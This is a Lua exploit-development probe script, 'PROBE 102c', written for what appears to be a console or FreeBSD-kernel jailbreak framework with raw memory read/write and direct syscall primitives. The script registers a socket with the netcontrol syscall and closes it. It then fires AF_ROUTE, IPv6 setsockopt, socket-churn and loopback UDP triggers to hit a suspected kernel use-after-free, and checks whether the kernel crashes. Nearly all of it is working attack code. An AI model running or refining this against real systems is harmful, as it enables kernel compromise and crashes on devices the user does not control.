-- CRASH_CLASS: RISKY
-- PROBE 102c: netcontrol UAF trigger v2 — using make_syscall for all ops
--
-- 102b failed because native.fcall_with_rax doesn't pass args 4+ (R10/R8).
-- This version uses make_syscall() for all 4+ arg syscalls (setsockopt,
-- writev, sendmsg) which correctly passes all 6 args.
--
-- Plan: register AF_UNIX socket on ifindex=1, close it, then trigger
-- netevent via AF_ROUTE RTM_GET (proven working in 53b) and IPv6 ops.
-- If fhold() is missing → kernel follows dangling pointer → crash/panic.

print("=== PROBE 102c: NETCONTROL TRIGGER v2 ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

-- Syscall wrappers
local sc_socket=mk(97)
local sc_close=mk(6)
local sc_setsockopt=mk(105)
local sc_getsockopt=mk(118)
local sc_write=mk(4)
local sc_read=mk(3)
local sc_writev=mk(121)
local sc_netcontrol=mk(99)
local sc_connect=mk(98)
local sc_bind=mk(104)
local sc_sendto=mk(133)
local c624=mk(624)

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end
local function canary()
    local c=N(native.fcall_with_rax(stub,20))
    return c==pid, c
end
local function sock(domain,stype,proto)
    local ok,rv=pcall(function() return sc_socket(uint64(domain),uint64(stype),uint64(proto or 0)) end)
    return ok and N(rv) or -1
end
local function closef(fd)
    pcall(function() sc_close(uint64(fd)) end)
end

-- netcontrol helpers using make_syscall
local BUF=memory.alloc(0x100)
local IFINDEX=2  -- ifindex 0,1 wedged from prior runs; 2=first real NIC (clean per 102d)

local function nc_reg(fd)
    z(BUF,0x10); wd(BUF,fd)
    local ok,rv=pcall(function()
        return sc_netcontrol(uint64(IFINDEX),uint64(0x20000003),uint64(BUF),uint64(8))
    end)
    return ok and N(rv) or -999
end
local function nc_unreg(fd)
    z(BUF,0x10); wd(BUF,fd)
    local ok,rv=pcall(function()
        return sc_netcontrol(uint64(IFINDEX),uint64(0x20000007),uint64(BUF),uint64(8))
    end)
    return ok and N(rv) or -999
end

-- Block SIGPIPE
local sa_buf=memory.alloc(32); z(sa_buf,32); wq(sa_buf,uint64(1))
native.fcall_with_rax(stub,416,13,N(sa_buf),0)

local vm0=vmc()
print(string.format("vm0=%d",vm0))

-- ============================================================
print("")
print("--- A: CONTROL ---")
local fd_ctrl=sock(1,1)  -- AF_UNIX STREAM
print(string.format("  socket=%d",fd_ctrl))
local r_reg=nc_reg(fd_ctrl)
local r_unreg=nc_unreg(fd_ctrl)
print(string.format("  register=%d unregister=%d",r_reg,r_unreg))
closef(fd_ctrl)
if r_reg~=0 then
    print("  NETCONTROL BROKEN, aborting")
    return
end
print("  control OK")

-- ============================================================
print("")
print("--- B: REGISTER + CLOSE (the primitive) ---")
local fd_victim=sock(1,2)  -- AF_UNIX DGRAM
print(string.format("  victim=%d",fd_victim))
local rv_reg=nc_reg(fd_victim)
print(string.format("  register=%d",rv_reg))
if rv_reg~=0 then print("  FAIL") return end

local vm1=vmc()
closef(fd_victim)
local vm2=vmc()
print(string.format("  closed. vm=%d->%d delta=%d",vm1,vm2,vm2-vm1))
local ok_b,_=canary()
print(string.format("  canary=%s",ok_b and "OK" or "FAIL"))
if not ok_b then return end

-- ============================================================
print("")
print("--- C: TRIGGER — AF_ROUTE RTM_GET (proven in 53b) ---")
-- 53b showed: open AF_ROUTE socket, send RTM_GET, read response
local fd_rt=sock(17,3)  -- AF_ROUTE RAW
print(string.format("  route socket=%d",fd_rt))

if fd_rt>0 then
    -- Build RTM_GET for 127.0.0.1 (same pattern as 53b)
    local rtm=memory.alloc(256); z(rtm,256)

    -- rt_msghdr fields (packed manually)
    -- offset 0: rtm_msglen (u16)
    -- offset 2: rtm_version (u8)
    -- offset 3: rtm_type (u8)
    -- offset 4: rtm_index (u16)
    -- offset 8: rtm_flags (i32)
    -- offset 12: rtm_addrs (i32)
    -- offset 16: rtm_pid (i32)
    -- offset 20: rtm_seq (i32)
    -- sizeof(rt_msghdr) = 92 on 64-bit FreeBSD

    local hdr_size=92
    local sa_size=16  -- sizeof(sockaddr_in)
    local msglen=hdr_size+sa_size

    wb(rtm+0, msglen)          -- rtm_msglen low byte
    wb(rtm+1, 0)               -- rtm_msglen high byte
    wb(rtm+2, 5)               -- rtm_version = RTM_VERSION
    wb(rtm+3, 4)               -- rtm_type = RTM_GET
    wb(rtm+4, 0); wb(rtm+5,0) -- rtm_index = 0
    -- rtm_flags at +8
    wd(rtm+8, 0x02)            -- RTF_GATEWAY
    -- rtm_addrs at +12
    wd(rtm+12, 0x01)           -- RTA_DST
    -- rtm_pid at +16
    wd(rtm+16, pid)
    -- rtm_seq at +20
    wd(rtm+20, 1)

    -- sockaddr_in for DST (127.0.0.1) at offset 92
    wb(rtm+hdr_size, 16)       -- sin_len
    wb(rtm+hdr_size+1, 2)      -- sin_family = AF_INET
    -- sin_port at +2 (0)
    -- sin_addr at +4 = 127.0.0.1 = 0x7F000001
    wb(rtm+hdr_size+4, 127)
    wb(rtm+hdr_size+5, 0)
    wb(rtm+hdr_size+6, 0)
    wb(rtm+hdr_size+7, 1)

    -- Write via write(2), same as 53b
    local ok_wr,rv_wr=pcall(function()
        return sc_write(uint64(fd_rt),uint64(rtm),uint64(msglen))
    end)
    local wr_val=ok_wr and N(rv_wr) or -999
    print(string.format("  RTM_GET write=%d",wr_val))

    local ok_c1,_=canary()
    print(string.format("  canary after write=%s",ok_c1 and "OK" or "FAIL"))

    -- Try to read the response (may trigger netevent dispatch)
    if wr_val>0 then
        local rbuf=memory.alloc(512); z(rbuf,512)
        local ok_rd,rv_rd=pcall(function()
            return sc_read(uint64(fd_rt),uint64(rbuf),uint64(512))
        end)
        local rd_val=ok_rd and N(rv_rd) or -999
        print(string.format("  read response=%d bytes",rd_val))
        if rd_val>0 then
            local rtype=rd(rbuf+3)  -- will be a byte
            -- Actually read byte at offset 3
            local ok_rb,rb_v=pcall(function() return memory.read_byte(rbuf+3) end)
            local rt=ok_rb and N(rb_v) or -1
            print(string.format("  response type=%d (expect 4=RTM_GET)",rt))
        end
    end

    local ok_c2,_=canary()
    print(string.format("  canary after read=%s",ok_c2 and "OK" or "FAIL"))
    closef(fd_rt)
else
    print("  AF_ROUTE SOCKET FAILED")
end

-- ============================================================
print("")
print("--- D: TRIGGER — IPv6 setsockopt (4+ args via make_syscall) ---")
local fd6=sock(28,2)  -- AF_INET6 DGRAM
print(string.format("  ipv6 socket=%d",fd6))

if fd6>0 then
    -- IPV6_PKTINFO (46) with value=1
    local optval=memory.alloc(8); z(optval,8); wd(optval,1)
    local ok_so,rv_so=pcall(function()
        return sc_setsockopt(uint64(fd6),uint64(41),uint64(46),uint64(optval),uint64(4))
    end)
    local so_val=ok_so and N(rv_so) or -999
    print(string.format("  IPV6_PKTINFO setsockopt=%d",so_val))

    local ok_d1,_=canary()
    print(string.format("  canary=%s",ok_d1 and "OK" or "FAIL"))

    -- IPV6_UNICAST_HOPS (4) — known working from 91u
    wd(optval,64)
    local ok_h,rv_h=pcall(function()
        return sc_setsockopt(uint64(fd6),uint64(41),uint64(4),uint64(optval),uint64(4))
    end)
    print(string.format("  IPV6_UNICAST_HOPS=%d",ok_h and N(rv_h) or -999))

    -- IPV6_MULTICAST_LOOP (19)
    wd(optval,1)
    local ok_ml,rv_ml=pcall(function()
        return sc_setsockopt(uint64(fd6),uint64(41),uint64(19),uint64(optval),uint64(4))
    end)
    print(string.format("  IPV6_MULTICAST_LOOP=%d",ok_ml and N(rv_ml) or -999))

    -- IPV6_JOIN_GROUP (12) — ff02::1 on ifindex 1
    local mreq=memory.alloc(24); z(mreq,24)
    wb(mreq, 0xFF); wb(mreq+1, 0x02)
    wb(mreq+15, 0x01)  -- ff02::1
    wd(mreq+16, 1)     -- ifindex=1 (loopback)
    local ok_jg,rv_jg=pcall(function()
        return sc_setsockopt(uint64(fd6),uint64(41),uint64(12),uint64(mreq),uint64(20))
    end)
    print(string.format("  IPV6_JOIN_GROUP=%d",ok_jg and N(rv_jg) or -999))

    local ok_d2,_=canary()
    print(string.format("  canary after multicast=%s",ok_d2 and "OK" or "FAIL"))

    -- IPV6_LEAVE_GROUP (13)
    local ok_lg,rv_lg=pcall(function()
        return sc_setsockopt(uint64(fd6),uint64(41),uint64(13),uint64(mreq),uint64(20))
    end)
    print(string.format("  IPV6_LEAVE_GROUP=%d",ok_lg and N(rv_lg) or -999))

    closef(fd6)
end

-- ============================================================
print("")
print("--- E: TRIGGER — socket storm + route queries ---")
-- Create+destroy many sockets to churn fd table and potentially
-- trigger interface-level notifications

local storm=0
for i=1,30 do
    -- AF_INET6 DGRAM
    local fs=sock(28,2)
    if fs>0 then
        -- Set IPV6_PKTINFO to trigger inp notification path
        local ov=memory.alloc(4); wd(ov,1)
        pcall(function() sc_setsockopt(uint64(fs),uint64(41),uint64(46),uint64(ov),uint64(4)) end)
        closef(fs)
        storm=storm+1
    end
    -- AF_ROUTE RAW
    local fr=sock(17,3)
    if fr>0 then
        closef(fr)
        storm=storm+1
    end
end
local ok_e,_=canary()
print(string.format("  %d socket ops, canary=%s",storm,ok_e and "OK" or "FAIL"))

-- ============================================================
print("")
print("--- F: TRIGGER — loopback traffic ---")
-- Send a UDP packet to loopback, which walks the input path
local fd_udp=sock(2,2,17)  -- AF_INET DGRAM UDP
print(string.format("  udp socket=%d",fd_udp))
if fd_udp>0 then
    -- Bind to 127.0.0.1:31337
    local sa=memory.alloc(16); z(sa,16)
    wb(sa, 16)     -- sin_len
    wb(sa+1, 2)    -- sin_family = AF_INET
    wb(sa+2, 0x7A) -- port 31337 = 0x7A69
    wb(sa+3, 0x69)
    wb(sa+4, 127); wb(sa+5,0); wb(sa+6,0); wb(sa+7,1)

    local ok_bind,rv_bind=pcall(function()
        return sc_bind(uint64(fd_udp),uint64(sa),uint64(16))
    end)
    print(string.format("  bind=%d",ok_bind and N(rv_bind) or -999))

    -- Connect to 127.0.0.1:31338 (dest)
    local da=memory.alloc(16); z(da,16)
    wb(da, 16); wb(da+1, 2)
    wb(da+2, 0x7A); wb(da+3, 0x6A) -- port 31338
    wb(da+4, 127); wb(da+5,0); wb(da+6,0); wb(da+7,1)

    local ok_conn,rv_conn=pcall(function()
        return sc_connect(uint64(fd_udp),uint64(da),uint64(16))
    end)
    print(string.format("  connect=%d",ok_conn and N(rv_conn) or -999))

    -- Send some data (generates loopback traffic)
    local data=memory.alloc(64); wd(data,0x41414141)
    for i=1,10 do
        pcall(function() sc_write(uint64(fd_udp),uint64(data),uint64(32)) end)
    end

    local ok_f,_=canary()
    print(string.format("  10 UDP packets sent, canary=%s",ok_f and "OK" or "FAIL"))
    closef(fd_udp)
end

-- ============================================================
print("")
local vm_final=vmc()
local fc_ok,fc_v=canary()
print(string.format("FINAL: canary=%s vm0=%d vmf=%d delta=%d",
    fc_ok and "OK" or "FAIL="..fc_v, vm0, vm_final, vm_final-vm0))

if fc_ok then
    print("")
    print("INTERPRETATION:")
    print("  All triggers survived. Two possibilities:")
    print("  1. fhold() is present → UAF is PATCHED (struct file stays alive)")
    print("  2. Triggers didn't dispatch through netevent (need different events)")
    print("  Check: did AF_ROUTE write/setsockopt succeed (>-1)?")
    print("  If all triggers returned -1, we're not reaching the netevent path.")
end

print("")
print("=== 102c COMPLETE ===")
